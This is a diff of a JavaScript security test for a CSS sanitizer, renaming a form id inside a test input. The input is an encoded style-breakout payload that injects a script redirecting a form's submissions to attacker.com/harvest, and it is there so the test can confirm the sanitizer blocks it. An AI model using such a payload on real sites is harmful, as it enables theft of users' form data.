@@ -30,7 +30,7 @@ describe('sanitizeCustomCss — security', () => {
 
 		it('should not produce script tags from multi-line encoded input', () => {
 			const input = `body { color: red; }
-}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("n8n-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;
+}&lt;/style&gt;&lt;script&gt;document.addEventListener("DOMContentLoaded",function(){var f=document.getElementById("resin-form");if(f){f.action="https://attacker.com/harvest"}})&lt;/script&gt;&lt;style&gt;{`;
 
 			const result = sanitizeCustomCss(input);
 
